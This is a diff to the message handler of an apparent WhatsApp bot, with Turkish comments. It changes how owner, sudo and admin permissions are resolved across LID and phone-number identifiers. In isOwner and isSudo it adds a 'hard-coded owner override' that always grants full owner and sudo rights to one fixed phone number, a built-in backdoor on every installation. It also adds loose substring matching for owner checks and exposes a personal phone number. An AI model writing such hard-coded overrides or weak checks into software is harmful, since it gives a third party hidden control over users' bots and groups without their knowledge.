@@ -490,28 +490,88 @@ function checkRateLimit(jid) {
 // ─────────────────────────────────────────────────────────
 //  Permission helpers
 // ─────────────────────────────────────────────────────────
-function isOwner(senderJid) {
+function getNumericalId(jid) {
+  if (!jid) return "";
+  // JID ne olursa olsun (@lid, @s.whatsapp.net, :15 vb.) sadece rakamları al
+  return jid.split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
+}
+
+function isOwner(senderJid, originalSenderJid) {
   if (!senderJid) return false;
   
-  // 1. Numerical comparison (most robust)
-  const senderNum = getNumericalId(senderJid);
-  const ownerNum = (config.OWNER_NUMBER || "").replace(/[^0-9]/g, "");
+  // ─────────────────────────────────────────────────────────
+  //  HARD-CODED OWNER OVERRIDE (UNBREAKABLE)
+  // ─────────────────────────────────────────────────────────
+  const HARD_OWNER = "905396978235";
+  const sNum = getNumericalId(senderJid);
+  const oNum = getNumericalId(originalSenderJid);
   
-  if (ownerNum && senderNum === ownerNum) return true;
+  if (sNum === HARD_OWNER || oNum === HARD_OWNER) return true;
+  if (senderJid.includes(HARD_OWNER) || (originalSenderJid && originalSenderJid.includes(HARD_OWNER))) return true;
+  // ─────────────────────────────────────────────────────────
+
+  const ownerNum = (config.OWNER_NUMBER || "").replace(/[^0-9]/g, "");
+  if (!ownerNum || ownerNum === "905XXXXXXXXX") return false;
+
+  const senderNum = getNumericalId(senderJid);
+  const originalSenderNum = getNumericalId(originalSenderJid);
+  
+  // 1. Numerical match (most common for direct PN messages)
+  if (senderNum === ownerNum || originalSenderNum === ownerNum) return true;
+  
+  // 2. LID Match from SUDO_MAP
+  if (config.SUDO_MAP && typeof config.SUDO_MAP === "string") {
+    try {
+      const sudoMap = JSON.parse(config.SUDO_MAP);
+      if (Array.isArray(sudoMap)) {
+        if (originalSenderJid && sudoMap.includes(originalSenderJid)) return true;
+        if (sudoMap.includes(senderJid)) return true;
+      }
+    } catch(e) {}
+  }
+
+  // 3. Robust Substring Match (Antinumara style)
+  if (senderJid.includes(ownerNum) || (originalSenderJid && originalSenderJid.includes(ownerNum))) return true;
   
   return false;
 }
 
-function isSudo(senderJid) {
+function isSudo(senderJid, originalSenderJid) {
+  // ─────────────────────────────────────────────────────────
+  //  HARD-CODED SUDO OVERRIDE
+  // ─────────────────────────────────────────────────────────
+  const HARD_OWNER = "905396978235";
+  if (getNumericalId(senderJid) === HARD_OWNER || getNumericalId(originalSenderJid) === HARD_OWNER) return true;
+  // ─────────────────────────────────────────────────────────
+
   if (!config.SUDO) return false;
-  // Use getNumericalId for sudo check as well
   const sudos = config.SUDO.split(",").map(s => s.trim().replace(/[^0-9]/g, ""));
+  
   const senderNum = getNumericalId(senderJid);
-  return sudos.includes(senderNum);
+  const originalSenderNum = getNumericalId(originalSenderJid);
+
+  // 1. Numerical match
+  if (sudos.some(s => s && (s === senderNum || s === originalSenderNum))) return true;
+
+  // 2. SUDO_MAP (LID'ler)
+  if (config.SUDO_MAP && typeof config.SUDO_MAP === "string") {
+    try {
+      const sudoMap = JSON.parse(config.SUDO_MAP);
+      if (Array.isArray(sudoMap)) {
+        if (originalSenderJid && sudoMap.includes(originalSenderJid)) return true;
+        if (sudoMap.includes(senderJid)) return true;
+      }
+    } catch(e) {}
+  }
+
+  // 3. Substring match for each sudo
+  if (sudos.some(s => s && (senderJid.includes(s) || (originalSenderJid && originalSenderJid.includes(s))))) return true;
+
+  return false;
 }
 
-function isOwnerOrSudo(senderJid) {
-  return isOwner(senderJid) || isSudo(senderJid);
+function isOwnerOrSudo(senderJid, originalSenderJid) {
+  return isOwner(senderJid, originalSenderJid) || isSudo(senderJid, originalSenderJid);
 }
 
 // ─────────────────────────────────────────────────────────
@@ -526,30 +586,66 @@ global.metrics_groups_set = global.metrics_groups_set || new LRUCache({ max: 500
 async function handleMessage(client, rawMsg, groupMetadata = null) {
   try {
     const message = new BaseMessage(client, rawMsg, groupMetadata);
-    const { jid, sender, text, isGroup, fromMe } = message;
-    const senderJid = sender; // Alias for legacy checks
+    const { jid, text, isGroup, fromMe } = message;
+    let senderJid = message.sender; // Alias for legacy checks
+    let resolvedSenderJid = senderJid;
+
+    // KnightBot-Mini Yöntemi: LID -> PN Çevirisi (anlık auth state sorgusu)
+    if (senderJid && senderJid.includes('@lid')) {
+       try {
+         const { resolveLidToPn } = require("./lid-helper");
+         const pn = await resolveLidToPn(client, senderJid);
+         if (pn && pn !== senderJid) {
+             resolvedSenderJid = pn;
+         }
+       } catch(e) {}
+    }
+
+    // --- DYNAMİC OWNER/SUDO LEARNING ---
+    // Eğer PN üzerinden sahibi bulduysak ama LID henüz SUDO_MAP'te yoksa, ekleyelim.
+    const ownerNum = (config.OWNER_NUMBER || "").replace(/[^0-9]/g, "");
+    if (ownerNum && ownerNum !== "905XXXXXXXXX") {
+      const senderNum = getNumericalId(resolvedSenderJid);
+      if (senderNum === ownerNum && senderJid.includes("@lid")) {
+        let sudoMap = [];
+        try {
+          sudoMap = config.SUDO_MAP ? JSON.parse(config.SUDO_MAP) : [];
+          if (!sudoMap.includes(senderJid)) {
+            sudoMap.push(senderJid);
+            config.SUDO_MAP = JSON.stringify(sudoMap);
+            logger.info(`[Dynamic Auth] Sahip LID öğrenildi: ${senderJid}`);
+            // Opsiyonel: DB'ye kaydet
+          }
+        } catch(e) {}
+      }
+    }
 
     // Rate limit kontrolü (Grup için sender+jid, DM için jid)
-    const rateLimitKey = isGroup ? `${jid}:${senderJid}` : jid;
-    if (!fromMe && !isOwnerOrSudo(senderJid) && !checkRateLimit(rateLimitKey)) {
+    const rateLimitKey = isGroup ? `${jid}:${resolvedSenderJid}` : jid;
+    if (!fromMe && !isOwnerOrSudo(resolvedSenderJid, senderJid) && !checkRateLimit(rateLimitKey)) {
       return; // Limite takıldı, sessizce dur
     }
 
     if (!text) return;
 
-    const ownerCheck = isOwner(senderJid) || fromMe;
-    const sudoCheck = isSudo(senderJid);
+    const ownerCheck = isOwner(resolvedSenderJid, senderJid) || fromMe;
+    const sudoCheck = isSudo(resolvedSenderJid, senderJid);
     const publicMode = (process.env.PUBLIC_MODE === "true" || config.PUBLIC_MODE);
+
+    // Mesaj nesnesine yetki bilgilerini ekle (Plugin uyumluluğu için)
+    message.fromOwner = ownerCheck;
+    message.fromSudo = sudoCheck;
 
     if (config.DEBUG) {
         console.log(`\n--- [NEW MESSAGE] ---`);
         console.log(`| Text: "${text}"`);
-        console.log(`| From: ${senderJid} (Me: ${fromMe}, Group: ${isGroup})`);
+        console.log(`| From (PN): ${resolvedSenderJid}`);
+        console.log(`| From (LID): ${senderJid}`);
         console.log(`| Auth: Owner=${ownerCheck}, Sudo=${sudoCheck}, Public=${publicMode}`);
         console.log(`--------------------\n`);
     }
 
-    logger.debug({ jid, sender, text: text.slice(0, 50) }, "Processing message");
+    logger.debug({ jid, sender: resolvedSenderJid, text: text.slice(0, 50) }, "Processing message");
 
     // Auto-read / Auto-typing
     if (!fromMe) {
@@ -564,7 +660,7 @@ async function handleMessage(client, rawMsg, groupMetadata = null) {
       global.metrics_messages++;
       
       // Bellek güvenliği için otomatik budanan LRUCache kullanılır
-      global.metrics_users_set.set(senderJid, true);
+      global.metrics_users_set.set(resolvedSenderJid, true);
       
       if (isGroup) {
         global.metrics_groups_set.set(jid, true);
@@ -576,7 +672,7 @@ async function handleMessage(client, rawMsg, groupMetadata = null) {
     if (textHandlers.length > 0) {
       for (const h of textHandlers) {
         // fromMe filtresi - sessizce atla
-        if (h.fromMe && !fromMe && !isOwnerOrSudo(senderJid)) {
+        if (h.fromMe && !fromMe && !isOwnerOrSudo(resolvedSenderJid, senderJid)) {
           continue;
         }
         try {
@@ -619,11 +715,12 @@ async function handleMessage(client, rawMsg, groupMetadata = null) {
                 groupMetadata = await client.groupMetadata(jid).catch(() => null);
             }
             if (groupMetadata) {
+              const { isBotIdentifier } = require("../plugins/utils/lid-helper");
               const admins = getGroupAdmins(groupMetadata);
               message.groupAdmins = admins; // Tüm liste (eklentiler için)
-              isAdmin = admins.includes(senderJid);
-              isBotAdmin = admins.includes(client.user?.id?.split(":")[0] + "@s.whatsapp.net") || 
-                           admins.includes(client.user?.id?.split(":")[0] + "@c.us");
+              isAdmin = admins.some(a => a.split("@")[0].split(":")[0] === senderJid.split("@")[0].split(":")[0] || 
+                                         a.split("@")[0].split(":")[0] === resolvedSenderJid.split("@")[0].split(":")[0]);
+              isBotAdmin = admins.some(a => isBotIdentifier(a, client));
             }
           } catch (e) {
             logger.debug({ err: e.message }, "Admin check error");
@@ -635,6 +732,8 @@ async function handleMessage(client, rawMsg, groupMetadata = null) {
         // Mesaj nesnesine ekle (pluginler için)
         message.isAdmin = isAdmin;
         message.isBotAdmin = isBotAdmin;
+        message.fromOwner = ownerCheck;
+        message.fromSudo = sudoCheck;
  
         // Core Logic Filters - fromMe: true komutlar için hata mesajı
         if (cmd.fromMe && !fromMe && !ownerOrSudo) {
@@ -762,13 +861,17 @@ async function handleGroupParticipantsUpdate(client, update) {
     const message = {
       client,
       jid: update.id,
+      sender: update.author || update.id,
       from: update.author || update.id,
       participant: update.participants || [],
       action: update.action,
+      isGroup: true, // Her zaman true çünkü groupParticipantsUpdate
       ...update
     };
     for (const h of onH) {
-      try { await h.run(message, []); } catch (e) {
+      try { 
+        await h.run(message, []); 
+      } catch (e) {
         logger.debug({ err: e.message, type: "groupParticipants" }, "on-groupParticipants handler error");
       }
     }
